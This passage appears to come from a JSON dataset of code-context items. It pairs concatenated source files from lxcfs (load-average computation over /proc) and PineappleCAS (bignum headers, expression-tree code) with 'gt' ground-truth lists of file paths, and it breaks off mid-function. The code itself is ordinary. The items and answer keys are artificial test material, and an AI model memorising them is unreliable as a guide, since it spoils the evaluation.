must_make_path(rel_path, \"/\", file->d_name, NULL);\n\t\t\tpd = depth - 1;\n\t\t\tsum = calc_pid(pid_buf, path_next, pd, sum, cfd);\n\t\t}\n\t}\n\n\tpath = must_make_path(rel_path, \"/cgroup.procs\", NULL);\n\tfd = openat(cfd, path, O_RDONLY | O_CLOEXEC);\n\tif (fd < 0)\n\t\treturn sum;\n\n\tf = fdopen_cached(fd, \"re\", &fdopen_cache);\n\tif (!f)\n\t\treturn sum;\n\n\twhile (getline(&line, &linelen, f) != -1) {\n\t\t__do_free char *task_pid = NULL;\n\t\tchar **pid;\n\n\t\ttask_pid = strdup(line);\n\t\tif (!task_pid)\n\t\t\treturn sum;\n\n\t\tpid = realloc(*pid_buf, sizeof(char *) * (sum + 1));\n\t\tif (!pid)\n\t\t\treturn sum;\n\t\t*pid_buf = pid;\n\t\t*(*pid_buf + sum) = move_ptr(task_pid);\n\t\tsum++;\n\t}\n\n\treturn sum;\n}\n\n\nstatic uint64_t calc_load(uint64_t load, uint64_t exp, uint64_t active)\n{\n\tuint64_t newload;\n\n\tactive = active > 0 ? active * FIXED_1 : 0;\n\tnewload = load * exp + active * (FIXED_1 - exp);\n\tif (active >= load)\n\t\tnewload += FIXED_1 - 1;\n\n\treturn newload / FIXED_1;\n}\n\n\nstatic int refresh_load(struct load_node *p, const char *path)\n{\n\tchar **idbuf = NULL;\n\tchar proc_path[STRLITERALLEN(\"/proc\n\t\t       2 * INTTYPE_TO_STRLEN(pid_t) + 1];\n\tint i, ret, run_pid = 0, total_pid = 0, last_pid = 0;\n\tsize_t linelen = 0;\n\tint sum, length;\n\tstruct dirent *file;\n\n\tidbuf = must_realloc(NULL, sizeof(char **));\n\n\tsum = calc_pid(&idbuf, path, DEPTH_DIR, 0, p->cfd);\n\tif (!sum)\n\t\tgoto out;\n\n\tfor (i = 0; i < sum; i++) {\n\t\t__do_closedir DIR *dp = NULL;\n\n\t\tlength = strlen(idbuf[i]) - 1;\n\t\tidbuf[i][length] = '\\0';\n\n\t\tret = snprintf(proc_path, sizeof(proc_path), \"/proc/%s/task\", idbuf[i]);\n\t\tif (ret < 0 || (size_t)ret > sizeof(proc_path)) {\n\t\t\ti = sum;\n\t\t\tsum = -1;\n\t\t\tlxcfs_error(\"%s\\n\", \"snprintf() failed in refresh_load.\");\n\t\t\tgoto err_out;\n\t\t}\n\n\t\tdp = opendir(proc_path);\n\t\tif (!dp) {\n\t\t\tlxcfs_error(\"Failed to open \\\"%s\\\"\", proc_path);\n\t\t\tcontinue;\n\t\t}\n\n\t\twhile ((file = readdir(dp)) != NULL) {\n\t\t\t__do_free char *line = NULL;\n\t\t\t__do_fclose FILE *f = NULL;\n\n\t\t\tif (strcmp(file->d_name, \".\") == 0)\n\t\t\t\tcontinue;\n\n\t\t\tif (strcmp(file->d_name, \"..\") == 0)\n\t\t\t\tcontinue;\n\n\t\t\ttotal_pid++;\n\n\n\t\t\tret = atof(file->d_name);\n\t\t\tlast_pid = (ret > last_pid) ? ret : last_pid;\n\n\t\t\tret = snprintf(proc_path, sizeof(proc_path),\n\t\t\t\t       \"/proc/%s/task/%s/status\", idbuf[i], file->d_name);\n\t\t\tif (ret < 0 || (size_t)ret > sizeof(proc_path)) {\n\t\t\t\ti = sum;\n\t\t\t\tsum = -1;\n\t\t\t\tlxcfs_error(\"%s\\n\", \"snprintf() failed in refresh_load.\");\n\t\t\t\tgoto err_out;\n\t\t\t}\n\n\t\t\tf = fopen(proc_path, \"re\");\n\t\t\tif (!f)\n\t\t\t\tcontinue;\n\n\t\t\twhile (getline(&line, &linelen, f) != -1)\n\t\t\t\tif ((line[0] == 'S') && (line[1] == 't'))\n\t\t\t\t\tbreak;\n\n\t\t\tif ((line[7] == 'R') || (line[7] == 'D'))\n\t\t\t\trun_pid++;\n\t\t}\n\t}\n\n\n\tp->avenrun[0]\t= calc_load(p->avenrun[0], EXP_1, run_pid);\n\tp->avenrun[1]\t= calc_load(p->avenrun[1], EXP_5, run_pid);\n\tp->avenrun[2]\t= calc_load(p->avenrun[2], EXP_15, run_pid);\n\tp->run_pid\t= run_pid;\n\tp->total_pid\t= total_pid;\n\tp->last_pid\t= last_pid;\n\nerr_out:\n\tfor (; i > 0; i--)\n\t\tfree(idbuf[i - 1]);\nout:\n\tfree(idbuf);\n\treturn sum;\n}\n\n\nstatic struct load_node *del_node(struct load_node *n, int locate)\n{\n\tstruct load_node *g;\n\n\tpthread_rwlock_wrlock(&load_hash[locate].rdlock);\n\tif (n->next == NULL) {\n\t\t*(n->pre) = NULL;\n\t} else {\n\t\t*(n->pre) = n->next;\n\t\tn->next->pre = n->pre;\n\t}\n\tg = n->next;\n\tfree_disarm(n->cg);\n\tfree_disarm(n);\n\tpthread_rwlock_unlock(&load_hash[locate].rdlock);\n\treturn g;\n}\n\n\nstatic void *load_begin(void *arg)\n{\n\n\tint first_node, sum;\n\tstruct load_node *f;\n\tclock_t time1, time2;\n\n\tfor (;;) {\n\t\tif (loadavg_stop == 1)\n\t\t\treturn NULL;\n\n\t\ttime1 = clock();\n\t\tfor (int i = 0; i < LOAD_SIZE; i++) {\n\t\t\tpthread_mutex_lock(&load_hash[i].lock);\n\t\t\tif (load_hash[i].next == NULL) {\n\t\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tf = load_hash[i].next;\n\t\t\tfirst_node = 1;\n\t\t\twhile (f) {\n\t\t\t\t__do_free char *path = NULL;\n\n\t\t\t\tpath = must_make_path_relative(f->cg, NULL);\n\n\t\t\t\tsum = refresh_load(f, path);\n\t\t\t\tif (sum == 0)\n\t\t\t\t\tf = del_node(f, i);\n\t\t\t\telse\n\t\t\t\t\tf = f->next;\n\n\n\t\t\t\tif (first_node == 1) {\n\t\t\t\t\tfirst_node = 0;\n\t\t\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (loadavg_stop == 1)\n\t\t\treturn NULL;\n\n\t\ttime2 = clock();\n\t\tusleep(FLUSH_TIME * 1000000 -\n\t\t       (int)((time2 - time1) * 1000000 / CLOCKS_PER_SEC));\n\t}\n}\n\n\nstatic int init_load(void)\n{\n\tint i;\n\tint ret;\n\n\tfor (i = 0; i < LOAD_SIZE; i++) {\n\t\tload_hash[i].next = NULL;\n\t\tret = pthread_mutex_init(&load_hash[i].lock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize lock\");\n\t\t\tgoto out3;\n\t\t}\n\n\t\tret = pthread_rwlock_init(&load_hash[i].rdlock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize rdlock\");\n\t\t\tgoto out2;\n\t\t}\n\n\t\tret = pthread_rwlock_init(&load_hash[i].rilock, NULL);\n\t\tif (ret) {\n\t\t\tlxcfs_error(\"Failed to initialize rilock\");\n\t\t\tgoto out1;\n\t\t}\n\t}\n\n\treturn 0;\n\nout1:\n\tpthread_rwlock_destroy(&load_hash[i].rdlock);\nout2:\n\tpthread_mutex_destroy(&load_hash[i].lock);\nout3:\n\twhile (i > 0) {\n\t\ti--;\n\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t}\n\n\treturn -1;\n}\n\nstatic void load_free(void)\n{\n\tstruct load_node *f, *p;\n\n\tfor (int i = 0; i < LOAD_SIZE; i++) {\n\t\tpthread_mutex_lock(&load_hash[i].lock);\n\t\tpthread_rwlock_wrlock(&load_hash[i].rdlock);\n\t\tpthread_rwlock_wrlock(&load_hash[i].rilock);\n\t\tif (load_hash[i].next == NULL) {\n\t\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\t\tpthread_rwlock_unlock(&load_hash[i].rilock);\n\t\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t\t\tpthread_rwlock_unlock(&load_hash[i].rdlock);\n\t\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t\t\tcontinue;\n\t\t}\n\n\t\tfor (f = load_hash[i].next; f;) {\n\t\t\tfree_disarm(f->cg);\n\t\t\tp = f->next;\n\t\t\tfree_disarm(f);\n\t\t\tf = p;\n\t\t}\n\n\t\tpthread_mutex_unlock(&load_hash[i].lock);\n\t\tpthread_mutex_destroy(&load_hash[i].lock);\n\t\tpthread_rwlock_unlock(&load_hash[i].rilock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rilock);\n\t\tpthread_rwlock_unlock(&load_hash[i].rdlock);\n\t\tpthread_rwlock_destroy(&load_hash[i].rdlock);\n\t}\n}\n\n\npthread_t load_daemon(int load_use)\n{\n\tint ret;\n\tpthread_t pid;\n\n\tret = init_load();\n\tif (ret == -1)\n\t\treturn (pthread_t)log_error(0, \"Initialize hash_table fails in load_daemon!\");\n\n\tret = pthread_create(&pid, NULL, load_begin, NULL);\n\tif (ret != 0) {\n\t\tload_free();\n\t\treturn (pthread_t)log_error(0, \"Create pthread fails in load_daemon!\");\n\t}\n\n\n\tloadavg = load_use;\n\treturn pid;\n}\n\n\nint load_daemon_v2(pthread_t *thread, int load_use)\n{\n\tint ret;\n\n\tret = init_load();\n\tif (ret == -1)\n\t\treturn log_error(-1, \"Initialize hash_table fails in load_daemon!\");\n\n\tret = pthread_create(thread, NULL, load_begin, NULL);\n\tif (ret != 0) {\n\t\tload_free();\n\t\treturn log_error(-1, \"%s - Create pthread fails in load_daemon!\", strerror(ret));\n\t}\n\n\n\tloadavg = load_use;\n\treturn 0;\n}\n\n\nint stop_load_daemon(pthread_t pid)\n{\n\tint s;\n\n\n\tloadavg_stop = 1;\n\n\ts = pthread_join(pid, NULL);\n\tif (s)\n\t\treturn log_error(-1, \"stop_load_daemon error: failed to join\");\n\n\tload_free();\n\tloadavg_stop = 0;\n\n\treturn 0;\n}\n\n'lxcfs/src/proc_fuse.h'\n:\n\n#ifndef __LXCFS_PROC_FUSE_H\n#define __LXCFS_PROC_FUSE_H\n\n#include \"config.h\"\n\n#include \"lxcfs_fuse.h\"\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include \"macro.h\"\n\n__visible extern int proc_getattr(const char *path, struct stat *sb);\n__visible extern int proc_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi);\n__visible extern int proc_open(const char *path, struct fuse_file_info *fi);\n__visible extern int proc_access(const char *path, int mask);\n__visible extern int proc_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi);\n__visible extern int proc_release(const char *path, struct fuse_file_info *fi);\n\n#endif\n",
        "gt": [
            "'lxcfs/src/macro.h'",
            "'lxcfs/src/proc_fuse.h'",
            "'lxcfs/src/bindings.h'",
            "'lxcfs/src/proc_loadavg.c'"
        ]
    },
    {
        "files": [
            "'PineappleCAS/src/imath/imath.h'",
            "'PineappleCAS/src/imath/imrat.h'",
            "'PineappleCAS/src/ast.h'",
            "'PineappleCAS/src/ast.c'"
        ],
        "content": "'PineappleCAS/src/imath/imath.h'\n:\n\n#ifndef IMATH_H_\n#define IMATH_H_\n\n#include <stdint.h>\n#include <limits.h>\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\ntypedef unsigned char      mp_sign;\ntypedef unsigned int       mp_size;\ntypedef int                mp_result;\ntypedef long               mp_small;\ntypedef unsigned long      mp_usmall;\n\n\n#undef  USE_64BIT_WORDS\n#ifdef  USE_64BIT_WORDS\ntypedef uint32_t           mp_digit;\ntypedef uint32_t           mp_word;\n#else\ntypedef uint16_t           mp_digit;\ntypedef uint32_t           mp_word;\n#endif\n\ntypedef struct mpz {\n  mp_digit    single;\n  mp_digit   *digits;\n  mp_size     alloc;\n  mp_size     used;\n  mp_sign     sign;\n} mpz_t, *mp_int;\n\n#define MP_DIGITS(Z) ((Z)->digits)\n#define MP_ALLOC(Z)  ((Z)->alloc)\n#define MP_USED(Z)   ((Z)->used)\n#define MP_SIGN(Z)   ((Z)->sign)\n\nextern const mp_result MP_OK;\nextern const mp_result MP_FALSE;\nextern const mp_result MP_TRUE;\nextern const mp_result MP_MEMORY;\nextern const mp_result MP_RANGE;\nextern const mp_result MP_UNDEF;\nextern const mp_result MP_TRUNC;\nextern const mp_result MP_BADARG;\nextern const mp_result MP_MINERR;\n\n#define MP_DIGIT_BIT    (sizeof(mp_digit) * CHAR_BIT)\n#define MP_WORD_BIT     (sizeof(mp_word) * CHAR_BIT)\n#define MP_SMALL_MIN    LONG_MIN\n#define MP_SMALL_MAX    LONG_MAX\n#define MP_USMALL_MIN   ULONG_MIN\n#define MP_USMALL_MAX   ULONG_MAX\n\n#ifndef UINT16_MAX\n#define UINT16_MAX (65535U)\n#endif\n\n#ifndef UINT32_MAX\n#define UINT32_MAX (4294967295UL)\n#endif\n\n#ifdef USE_64BIT_WORDS\n#  define MP_DIGIT_MAX   (UINT32_MAX * UINT64_C(1))\n#  define MP_WORD_MAX    (UINT64_MAX)\n#else\n#  define MP_DIGIT_MAX   (UINT16_MAX * 1UL)\n#  define MP_WORD_MAX    (UINT32_MAX * 1UL)\n#endif\n\n#define MP_MIN_RADIX    2\n#define MP_MAX_RADIX    36\n\n\n#define MP_MULT_THRESH  22\n\n#define MP_DEFAULT_PREC 8\n\nextern const mp_sign   MP_NEG;\nextern const mp_sign   MP_ZPOS;\n\n#define mp_int_is_odd(Z)  ((Z)->digits[0] & 1)\n#define mp_int_is_even(Z) !((Z)->digits[0] & 1)\n\nmp_result mp_int_init(mp_int z);\nmp_int    mp_int_alloc(void);\nmp_result mp_int_init_size(mp_int z, mp_size prec);\nmp_result mp_int_init_copy(mp_int z, mp_int old);\nmp_result mp_int_init_value(mp_int z, mp_small value);\nmp_result mp_int_init_uvalue(mp_int z, mp_usmall uvalue);\nmp_result mp_int_set_value(mp_int z, mp_small value);\nmp_result mp_int_set_uvalue(mp_int z, mp_usmall uvalue);\nvoid      mp_int_clear(mp_int z);\nvoid      mp_int_free(mp_int z);\n\nmp_result mp_int_copy(mp_int a, mp_int c);\nvoid      mp_int_swap(mp_int a, mp_int c);\nvoid      mp_int_zero(mp_int z);\nmp_result mp_int_abs(mp_int a, mp_int c);\nmp_result mp_int_neg(mp_int a, mp_int c);\nmp_result mp_int_add(mp_int a, mp_int b, mp_int c);\nmp_result mp_int_add_value(mp_int a, mp_small value, mp_int c);\nmp_result mp_int_sub(mp_int a, mp_int b, mp_int c);\nmp_result mp_int_sub_value(mp_int a, mp_small value, mp_int c);\nmp_result mp_int_mul(mp_int a, mp_int b, mp_int c);\nmp_result mp_int_mul_value(mp_int a, mp_small value, mp_int c);\nmp_result mp_int_mul_pow2(mp_int a, mp_small p2, mp_int c);\nmp_result mp_int_sqr(mp_int a, mp_int c);\nmp_result mp_int_div(mp_int a, mp_int b,\n\t\t     mp_int q, mp_int r);\nmp_result mp_int_div_value(mp_int a, mp_small value,\n\t\t\t   mp_int q, mp_small *r);\nmp_result mp_int_div_pow2(mp_int a, mp_small p2,\n\t\t\t  mp_int q, mp_int r);\nmp_result mp_int_mod(mp_int a, mp_int m, mp_int c);\n#define   mp_int_mod_value(A, V, R) mp_int_div_value((A), (V), 0, (R))\nmp_result mp_int_expt(mp_int a, mp_small b, mp_int c);\nmp_result mp_int_expt_value(mp_small a, mp_small b, mp_int c);\nmp_result mp_int_expt_full(mp_int a, mp_int b, mp_int c);\n\nint       mp_int_compare(mp_int a, mp_int b);\nint       mp_int_compare_unsigned(mp_int a, mp_int b);\nint       mp_int_compare_zero(mp_int z);\nint       mp_int_compare_value(mp_int z, mp_small v);\nint       mp_int_compare_uvalue(mp_int z, mp_usmall uv);\n\n\nint       mp_int_divisible_value(mp_int a, mp_small v);\n\n\nint       mp_int_is_pow2(mp_int z);\n\nmp_result mp_int_exptmod(mp_int a, mp_int b, mp_int m,\n\t\t\t mp_int c);\nmp_result mp_int_exptmod_evalue(mp_int a, mp_small value,\n\t\t\t\tmp_int m, mp_int c);\nmp_result mp_int_exptmod_bvalue(mp_small value, mp_int b,\n\t\t\t\tmp_int m, mp_int c);\nmp_result mp_int_exptmod_known(mp_int a, mp_int b,\n\t\t\t       mp_int m, mp_int mu,\n\t\t\t       mp_int c);\nmp_result mp_int_redux_const(mp_int m, mp_int c);\n\nmp_result mp_int_invmod(mp_int a, mp_int m, mp_int c);\n\nmp_result mp_int_gcd(mp_int a, mp_int b, mp_int c);\n\nmp_result mp_int_egcd(mp_int a, mp_int b, mp_int c,\n\t\t      mp_int x, mp_int y);\n\nmp_result mp_int_lcm(mp_int a, mp_int b, mp_int c);\n\nmp_result mp_int_root(mp_int a, mp_small b, mp_int c);\n#define   mp_int_sqrt(a, c) mp_int_root(a, 2, c)\n\n\nmp_result mp_int_to_int(mp_int z, mp_small *out);\nmp_result mp_int_to_uint(mp_int z, mp_usmall *out);\n\n\nmp_result mp_int_to_string(mp_int z, mp_size radix,\n\t\t\t   char *str, int limit);\n\n\nmp_result mp_int_string_len(mp_int z, mp_size radix);\n\n\nmp_result mp_int_read_string(mp_int z, mp_size radix, const char *str);\nmp_result mp_int_read_cstring(mp_int z, mp_size radix, const char *str,\n\t\t\t      char **end);\n\n\nmp_result mp_int_count_bits(mp_int z);\n\n\nmp_result mp_int_to_binary(mp_int z, unsigned char *buf, int limit);\n\n\nmp_result mp_int_read_binary(mp_int z, unsigned char *buf, int len);\n\n\nmp_result mp_int_binary_len(mp_int z);\n\n\nmp_result mp_int_to_unsigned(mp_int z, unsigned char *buf, int limit);\n\n\nmp_result mp_int_read_unsigned(mp_int z, unsigned char *buf, int len);\n\n\nmp_result mp_int_unsigned_len(mp_int z);\n\n\nconst char *mp_error_string(mp_result res);\n\n#if DEBUG\nvoid      s_print(char *tag, mp_int z);\nvoid      s_print_buf(char *tag, mp_digit *buf, mp_size num);\n#endif\n\n#ifdef __cplusplus\n}\n#endif\n#endif\n\n'PineappleCAS/src/imath/imrat.h'\n:\n\n#ifndef IMRAT_H_\n#define IMRAT_H_\n\n#include \"imath.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\ntypedef struct mpq {\n  mpz_t   num;\n  mpz_t   den;\n} mpq_t, *mp_rat;\n\n#define MP_NUMER_P(Q)  (&((Q)->num))\n#define MP_DENOM_P(Q)  (&((Q)->den))\n\n\ntypedef enum {\n  MP_ROUND_DOWN,\n  MP_ROUND_HALF_UP,\n  MP_ROUND_UP,\n  MP_ROUND_HALF_DOWN\n} mp_round_mode;\n\nmp_result mp_rat_init(mp_rat r);\nmp_rat    mp_rat_alloc(void);\nmp_result mp_rat_reduce(mp_rat r);\nmp_result mp_rat_init_size(mp_rat r, mp_size n_prec, mp_size d_prec);\nmp_result mp_rat_init_copy(mp_rat r, mp_rat old);\nmp_result mp_rat_set_value(mp_rat r, mp_small numer, mp_small denom);\nmp_result mp_rat_set_uvalue(mp_rat r, mp_usmall numer, mp_usmall denom);\nvoid      mp_rat_clear(mp_rat r);\nvoid      mp_rat_free(mp_rat r);\nmp_result mp_rat_numer(mp_rat r, mp_int z);\nmp_int    mp_rat_numer_ref(mp_rat r);\nmp_result mp_rat_denom(mp_rat r, mp_int z);\nmp_int    mp_rat_denom_ref(mp_rat r);\nmp_sign   mp_rat_sign(mp_rat r);\n\nmp_result mp_rat_copy(mp_rat a, mp_rat c);\nvoid      mp_rat_zero(mp_rat r);\nmp_result mp_rat_abs(mp_rat a, mp_rat c);\nmp_result mp_rat_neg(mp_rat a, mp_rat c);\nmp_result mp_rat_recip(mp_rat a, mp_rat c);\nmp_result mp_rat_add(mp_rat a, mp_rat b, mp_rat c);\nmp_result mp_rat_sub(mp_rat a, mp_rat b, mp_rat c);\nmp_result mp_rat_mul(mp_rat a, mp_rat b, mp_rat c);\nmp_result mp_rat_div(mp_rat a, mp_rat b, mp_rat c);\n\nmp_result mp_rat_add_int(mp_rat a, mp_int b, mp_rat c);\nmp_result mp_rat_sub_int(mp_rat a, mp_int b, mp_rat c);\nmp_result mp_rat_mul_int(mp_rat a, mp_int b, mp_rat c);\nmp_result mp_rat_div_int(mp_rat a, mp_int b, mp_rat c);\nmp_result mp_rat_expt(mp_rat a, mp_small b, mp_rat c);\n\nint       mp_rat_compare(mp_rat a, mp_rat b);\nint       mp_rat_compare_unsigned(mp_rat a, mp_rat b);\nint       mp_rat_compare_zero(mp_rat r);\nint       mp_rat_compare_value(mp_rat r, mp_small n, mp_small d);\nint       mp_rat_is_integer(mp_rat r);\n\n\nmp_result mp_rat_to_ints(mp_rat r, mp_small *num, mp_small *den);\n\n\nmp_result mp_rat_to_string(mp_rat r, mp_size radix, char *str, int limit);\n\n\nmp_result mp_rat_to_decimal(mp_rat r, mp_size radix, mp_size prec,\n                            mp_round_mode round, char *str, int limit);\n\n\nmp_result mp_rat_string_len(mp_rat r, mp_size radix);\n\n\nmp_result mp_rat_decimal_len(mp_rat r, mp_size radix, mp_size prec);\n\n\nmp_result mp_rat_read_string(mp_rat r, mp_size radix, const char *str);\nmp_result mp_rat_read_cstring(mp_rat r, mp_size radix, const char *str,\n\t\t\t      char **end);\nmp_result mp_rat_read_ustring(mp_rat r, mp_size radix, const char *str,\n\t\t\t      char **end);\n\n\nmp_result mp_rat_read_decimal(mp_rat r, mp_size radix, const char *str);\nmp_result mp_rat_read_cdecimal(mp_rat r, mp_size radix, const char *str,\n\t\t\t       char **end);\n\n#ifdef __cplusplus\n}\n#endif\n#endif\n\n'PineappleCAS/src/ast.h'\n:#ifndef AST_H_\n#define AST_H_\n\n#include \"imath/imrat.h\"\n#include \"error.h\"\n\n#include <stdlib.h>\n#include <stdbool.h>\n\n#define LSIZE unsigned\n#define RADIX 10\n\ntypedef enum {\n    NODE_NUMBER, NODE_SYMBOL, NODE_OPERATOR\n} NodeType;\n\n#define is_op_commutative(op) ((op) == OP_ADD || (op) == OP_MULT)\n\n#define is_op_operator(op) ((op) >= OP_ADD && (op) <= OP_LOG)\n#define is_op_function(op) ((op) >= OP_INT && (op) <= OP_TANH_INV)\n\n#define is_op_nary(op) ((op) >= OP_ADD && (op) <= OP_LOG)\n#define is_op_unary(op) ((op) >= OP_FACTORIAL && (op) <= OP_TANH_INV)\n\ntypedef enum {\n\n    OP_ADD,\n    OP_MULT, OP_DIV,\n\n    OP_POW, OP_ROOT,\n    OP_LOG,\n\n\n    OP_DERIV,\n\n\n    OP_FACTORIAL,\n\n    OP_INT, OP_ABS,\n\n    OP_SIN, OP_SIN_INV,\n    OP_COS, OP_COS_INV,\n    OP_TAN, OP_TAN_INV,\n\n    OP_SINH, OP_SINH_INV,\n    OP_COSH, OP_COSH_INV,\n    OP_TANH, OP_TANH_INV,\n\n    AMOUNT_OPS\n} OperatorType;\n\n#define AMOUNT_SYMBOLS 30\n\ntypedef enum {\n    SYM_A = 'A',\n    SYM_B, SYM_C, SYM_D, SYM_E, SYM_F,\n    SYM_G, SYM_H, SYM_I, SYM_J, SYM_K,\n    SYM_L, SYM_M, SYM_N, SYM_O, SYM_P,\n    SYM_Q, SYM_R, SYM_S, SYM_T, SYM_U,\n    SYM_V, SYM_W, SYM_X, SYM_Y, SYM_Z,\n\n    SYM_IMAG,\n\n    SYM_PI, SYM_EULER, SYM_THETA,\n\n    SYM_INVALID\n} Symbol;\n\n\n#define optype(e)       e->op.operator.type\n#define isoptype(e, op) ((e)->type == NODE_OPERATOR && optype(e) == (op))\n#define opbase(e)       e->op.operator.base\n\n#define is_ast_int(e, val) ((e)->type == NODE_NUMBER && mp_rat_compare_value((e)->op.num, val, 1) == 0)\n\ntypedef struct _pcas_Node {\n\n    NodeType type;\n\n    struct _pcas_Node *next;\n\n    union {\n\n        mp_rat num;\n\n\n        Symbol symbol;\n\n\n        struct {\n            OperatorType type;\n\n\n            struct _pcas_Node *base;\n\n        } operator;\n    } op;\n\n} pcas_ast_t;\n\n\n\nmp_rat num_FromString(const char *str);\nmp_rat num_FromInt(mp_small num);\nmp_rat num_FromFraction(mp_small num, mp_small den);\nmp_rat num_Copy(mp_rat other);\nchar *num_ToString(mp_rat num, mp_size precision);\nvoid num_Cleanup(mp_rat num);\n\npcas_ast_t *ast_MakeNumber(mp_rat num);\npcas_ast_t *ast_MakeSymbol(char symbol);\n\npcas_ast_t *ast_MakeOperator(OperatorType type);\npcas_ast_t *ast_MakeUnary(OperatorType type, pcas_ast_t *operand);\npcas_ast_t *ast_MakeBinary(OperatorType type, pcas_ast_t *left, pcas_ast_t *right);\n\npcas_ast_t *ast_Copy(pcas_ast_t *e);\nbool ast_Compare(pcas_ast_t *a, pcas_ast_t *b);\n\nvoid ast_Cleanup(pcas_ast_t *e);\n\n\npcas_error_t ast_ChildAppend(pcas_ast_t *parent, pcas_ast_t *child);\npcas_error_t ast_ChildInsert(pcas_ast_t *parent, pcas_ast_t *child, LSIZE index);\n\npcas_ast_t *ast_ChildGet(pcas_ast_t *parent, LSIZE index);\npcas_ast_t *ast_ChildGetLast(pcas_ast_t *parent);\n\n\nLSIZE ast_ChildIndexOf(pcas_ast_t *parent, pcas_ast_t *child);\n\n\npcas_ast_t *ast_ChildRemove(pcas_ast_t *parent, pcas_ast_t *child);\npcas_ast_t *ast_ChildRemoveIndex(pcas_ast_t *parent, LSIZE index);\n\nLSIZE ast_ChildLength(pcas_ast_t *parent);\n\n#endif\n'PineappleCAS/src/ast.c'\n:#include \"ast.h\"\n\nmp_rat num_FromString(const char *str) {\n    mp_rat n = mp_rat_alloc();\n    mp_rat_init(n);\n    mp_rat_read_decimal(n, RADIX, str);\n    return n;\n}\n\nmp_rat num_FromInt(mp_small num) {\n    mp_rat n = mp_rat_alloc();\n    mp_rat_init(n);\n    mp_rat_set_value(n, num, 1);\n    return n;\n}\n\nmp_rat num_FromFraction(mp_small num, mp_small den) {\n    mp_rat n = mp_rat_alloc();\n    mp_rat_init(n);\n    mp_rat_set_value(n, num, den);\n    return n;\n}\n\nmp_rat num_Copy(mp_rat other) {\n    mp_rat n = mp_rat_alloc();\n    mp_rat_init_copy(n, other);\n    return n;\n}\n\nchar *num_ToString(mp_rat num, mp_size precision) {\n    mp_result res;\n\n    char *str;\n    int len;\n\n    if(mp_rat_is_integer(num)) {\n        mp_rat_reduce(num);\n        len = mp_int_string_len(&num->num, RADIX);\n        str = malloc(len * sizeof(char));\n        if((res = mp_int_to_string(&num->num, RADIX, str, len)) != MP_OK) {\n            free(str);\n            return NULL;\n        }\n    } else {\n        len = mp_rat_decimal_len(num, RADIX, precision);\n        str = malloc(len * sizeof(char));\n        if((res = mp_rat_to_decimal(num, RADIX, precision, MP_ROUND_HALF_UP, str, len)) != MP_OK) {\n            free(str);\n            return NULL;\n        }\n    }\n\n    return str;\n}\n\nvoid num_Cleanup(mp_rat num) {\n    if(num != NULL)\n        mp_rat_free(num);\n}\n\npcas_ast_t *ast_MakeNumber(mp_rat num) {\n    pcas_ast_t *ret = malloc(sizeof(pcas_ast_t));\n    ret->type = NODE_NUMBER;\n    ret->next = NULL;\n\n    ret->op.num = num;\n\n    return ret;\n}\n\npcas_ast_t *ast_MakeSymbol(char symbol) {\n    pcas_ast_t *ret = malloc(sizeof(pcas_ast_t));\n    ret->type = NODE_SYMBOL;\n    ret->next = NULL;\n\n    ret->op.symbol = symbol;\n\n    return ret;\n}\n\npcas_ast_t *ast_MakeOperator(OperatorType type) {\n    pcas_ast_t *ret = malloc(sizeof(pcas_ast_t));\n    ret->type = NODE_OPERATOR;\n    ret->next = NULL;\n\n    optype(ret) = type;\n    opbase(ret) = NULL;\n\n    return ret;\n}\n\npcas_ast_t *ast_MakeUnary(OperatorType type, pcas_ast_t *operand) {\n    pcas_ast_t *ret = ast_MakeOperator(type);\n    ast_ChildAppend(ret, operand);\n    return ret;\n}\n\npcas_ast_t *ast_MakeBinary(OperatorType type, pcas_ast_t *left, pcas_ast_t *right) {\n    pcas_ast_t *ret = ast_MakeOperator(type);\n    ast_ChildAppend(ret, left);\n    ast_ChildAppend(ret, right);\n    return ret;\n}\n\npcas_ast_t *ast_Copy(pcas_ast_t *e) {\n    if(e == NULL)\n        return NULL;\n\n    switch(e->type) {\n    case NODE_NUMBER:\n        return ast_MakeNumber(num_Copy(e->op.num));\n    case NODE_SYMBOL:\n        return ast_MakeSymbol(e->op.symbol);\n    case NODE_OPERATOR: {\n        pcas_ast_t *copy, *child;\n\n        copy = ast_MakeOperator(optype(e));\n        child = opbase(e);\n\n        for(child = opbase(e); child != NULL; child = child->next)\n            ast_ChildAppend(copy, ast_Copy(child));\n\n        return copy;\n    }\n    }\n\n    return NULL;\n}\n\nstatic bool has_used(const unsigned *buffer, unsigned top, unsigned index) {\n    unsigned i;\n\n    for(i = 0; i < top; i++) {\n        if(buffer[i] == index)\n            return true;\n    }\n\n    return false;\n}\n\nbool ast_Compare(pcas_ast_t *a, pcas_ast_t *b) {\n    if(a == b)\n        return true;\n\n    if(a->type != b->type)\n        return false;\n\n    switch(a->type) {\n    case NODE_NUMBER:\n        return mp_rat_compare(a->op.num, b->op.num) == 0;\n    case NODE_SYMBOL:\n        return a->op.symbol == b->op.symbol;\n    case NODE_OPERATOR: {\n        unsigned length;\n\n        if(optype(a) != optype(b))\n            return false;\n\n        if((length = ast_ChildLength(a)) != ast_ChildLength(b))\n            return false;\n\n\n        if(optype(a) == OP_MULT || optype(a) == OP_ADD) {\n            unsigned a_index, b_index;\n            unsigned top = 0;\n\n            bool had_match = true;\n\n\n            unsigned *buffer = calloc(length, sizeof(unsigned));\n\n            for(a_index = 0; a_index < length && had_match; a_index++) {\n\n                pcas_ast_t *a_child = ast_ChildGet(a, 